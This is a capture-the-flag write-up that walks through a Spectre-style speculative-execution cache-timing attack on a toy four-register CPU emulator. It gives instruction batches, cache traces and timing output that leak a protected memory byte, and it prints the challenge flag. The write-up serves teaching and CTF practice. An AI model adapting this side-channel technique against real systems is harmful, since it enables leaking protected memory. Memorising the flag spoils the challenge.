# Chrono Specter: The Phantom Execution

**Author:** Eappen  
**Points:** 500  
**Difficulty:** Hard
**Category:** Hardware


![[boo.svg]]
## Description

Deep within the cyber-ruins of _Neo-Tokyo_, an abandoned **prototype CPU** lies dormant—its architecture lost to time, its secrets buried within the very fabric of its execution. Legend speaks of the _Chrono Engine_, an experimental processor designed by the enigmatic _Dr. Akihiko Mori_, a genius whose research vanished under mysterious circumstances.

You, a rogue cyber-archaeologist, have stumbled upon a **fragment of his codebase**, etched into an ancient machine with **only four registers and 256 bytes of memory**. A fragile relic of the past, yet strangely… ahead of its time.

A terminal flickers before you. A test sequence awaits. A chance to uncover the lost knowledge of _Dr. Mori_ and expose the hidden truths buried in the machine’s fading whispers.

Given files:

[[D_Chronicles_of_future]]

Flag:`apoorvCTF{Sp3culat1on_1s_H4rd!}`
## Solution

Now, let's dive headfirst into the exploit mechanics. The CPU, in its relentless pursuit of performance, blindly executes instructions without immediate permission verification—because, hey, who wants the overhead of security checks slowing things down? Instead, it lazily defers permission validation by pushing access requests onto a stack, only to batch-process them later. If a violation is detected, it dutifully rolls back register states, but here's the kicker—the cache remains blissfully untouched. This subtle inconsistency creates a prime opportunity for a side-channel attack. By strategically timing cache hits, we can leak sensitive memory contents before the CPU even realizes its mistake. Attached with the writeup is my script, which surgically extracts the value from a target memory location (161) using this vulnerability.

![[hack.txt]]

#### Analysis of a single batch

```bash
batch:
load $r2 161($r1)
load $r2 0($r2)
load $r2 assumption
```

Lets analyse each memory, cache and register elements after each line.

assume time for hit = 20ns and miss = 40ns

format of the object is {mem/reg address:value}

##### In case of wrong assumption

0. Before Execution:
```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:invalid,....,161:invalid,.....,255:invalid} //assuming memory and cache have same size for explanation not going much detailed into paging and all
registers={r1:0,r2:0,r3:0,r4:0}
```

1. Line1:

```bash
load $r2 161($r1) # OOB no access to 161 cpu speculates no error and stores into stack but continues to execute following lines
#loads 161+(valueof($r1)=0) to cache and r2 161 is a cache miss
```

CPU State:
```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:invalid,....,161:112/*miss and load*/,.....,255:invalid} 
registers={r1:0,r2:112,r3:0,r4:0}
```

2. Line 2:

```bash
load $r2 0($r2) #loads value at 112th location to r2 no exception
#112 is missed in the cache but will be loaded to cache
```

CPU State:
```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:0/*miss and load*/,....,161:112,.....,255:invalid} 
registers={r1:0,r2:0,r3:0,r4:0}
```

3. Line 3:

``` bash
load $r2 0 #loads 0th mem location to cache
```


CPU State:

```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:0/*miss and load*/,.....,112:0,....,161:112,.....,255:invalid} 
registers={r1:0,r2:0,r3:0,r4:0}
```

| Line No | Instruction         | Accessed Location | Hit-1 Miss-0 | Time taken |
| ------- | ------------------- | ----------------- | ------------ | ---------- |
| 1       | `load $r2 161($r1)` | 161               | 0            | 40ns       |
| 2       | `load $r2 0($r2)`   | 112               | 0            | 40ns       |
| 3       | `load $r2 0`        | 0                 | 0            | 40ns       |
|         |                     |                   | Total time   | 120ns      |
## In case of right assumption

Before Execution:
```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:invalid,....,161:invalid,.....,255:invalid} //assuming memory and cache have same size for explanation not going much detailed into paging and all
registers={r1:0,r2:0,r3:0,r4:0}
```

Line1:

```bash
load $r2 161($r1) # OOB no access to 161 cpu speculates no error and stores into stack but continues to execute following lines
#loads 161+(valueof($r1)=0) to cache and r2 161 is a cache miss
```

CPU State:

```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:invalid,....,161:112/*miss and load*/,.....,255:invalid} 
registers={r1:0,r2:112,r3:0,r4:0}
```

Line 2:

```bash
load $r2 0($r2) #loads value at 112th location to r2 no exception
#112 is missed in the cache but will be loaded to cache
```

CPU State:
```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:0/*miss and load*/,....,161:112,.....,255:invalid} 
registers={r1:0,r2:0,r3:0,r4:0}
```

Line 3:

``` bash
load $r2 112 #loads 112th mem location to cache
```


CPU State:

```js
memory={0:invalid,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:0/*hit*/,....,161:112,.....,255:invalid} 
registers={r1:0,r2:0,r3:0,r4:0}
```



| Line No | Instruction         | Accessed Location | Hit-1 Miss-0 | Time taken |
| ------- | ------------------- | ----------------- | ------------ | ---------- |
| 1       | `load $r2 161($r1)` | 161               | 0            | 40ns       |
| 2       | `load $r2 0($r2)`   | 112               | 0            | 40ns       |
| 3       | `load $r2 112`      | 112               | 1            | 20ns       |
|         |                     |                   | Total time   | 100ns      |
##### Implementation

Input:
```bash
...

batch:
load $r2 161($r1)
load $r2 0($r2)
load $r2 111

batch:
load $r2 161($r1)
load $r2 0($r2)
load $r2 112

batch:
load $r2 161($r1)
load $r2 0($r2)
load $r2 113

...
```

Output:
```bash
...

line 1 thrown error 1

165.91048955596835ns
--BATCHEND112--

line 1 thrown error 1

130.4860988094251ns #taken less time than nearby batches
--BATCHEND113--#batch numbering starts from 1

line 1 thrown error 1

157.5329912728921ns
--BATCHEND114--

...
```

> Note: Once the CPU finishes processing the instruction batch, it retroactively traverses the permission stack, sniffs out any violations, and dutifully rolls back execution. Depending on the severity of the exception, it either reverts to the previous consistent state or nukes everything back to the initial state. In other words, after exception handling, the CPU state will be:

```js
memory={0:0,.....,112:0,....,161:112,.....,255:0}
cache={0:invalid,.....,112:invalid,....,161:invalid,.....,255:invalid} 
registers={r1:0,r2:0,r3:0,r4:0}
```


So the total time taken to execute the batch will be :
> _Time_taken_for_execution+_
> _Time_taken_for_error_handiling+_
> _randomness_due_to_environmental_factors(negligible)_

In this run, the second batch executed noticeably faster than the first—confirming our hypothesis. That means the value at memory address 161 is indeed **112**.

By extrapolating this technique, we can brute-force all **127 possible ASCII values** for any restricted (read-protected) memory location. Essentially, we’ll need **127 speculative execution batches** to leak a single byte via side-channel timing. The raw CPU output has been logged in a text file for further analysis.

### Additional Info & Final Thoughts

This is a **minimalistic yet potent** implementation of a well-known hardware vulnerability—**Spectre**. Alongside **Meltdown**, Spectre exposes a fundamental flaw in modern CPU design, where speculative execution prioritizes speed over security.

Here’s the core issue: when the CPU encounters an expensive instruction, it **speculatively executes the next instruction in parallel**, assuming the first one was valid. If it later detects a misprediction, it rolls back execution and throws a **SIGTRAP**. However, the damage is already done—**cached memory remains unchanged**, leaving behind a forensic trail of leaked data.

Hackers exploit this flaw using **side-channel timing attacks**, cleverly inferring restricted memory contents based on cache access times. This makes Spectre not just an exploit, but a class of vulnerabilities that persist across generations of hardware, requiring both software and firmware-level mitigations.

Eg:
![[Pasted image 20250302211238.png]]
![[Pasted image 20250302211359.png]]
![[Pasted image 20250302211158.png]]
![[Pasted image 20250302211434.png]]
Reference:
1. https://www.youtube.com/watch?v=q3-xCvzBjGs
2. https://www.youtube.com/watch?v=JSqDqNysycQ
3. https://spectreattack.com/spectre.pdf - Research paper

**Fun fact:** If you had fed the README into GPT and prompted it to derive a solution, it would have produced an almost perfect implementation. Your task was merely to extract the core idea and fine-tune the script to suit your specific needs. Kudos to those who cracked it—or even attempted it! Crafting such a hands-on, real-world challenge was an absolute blast.

-_Eappen_
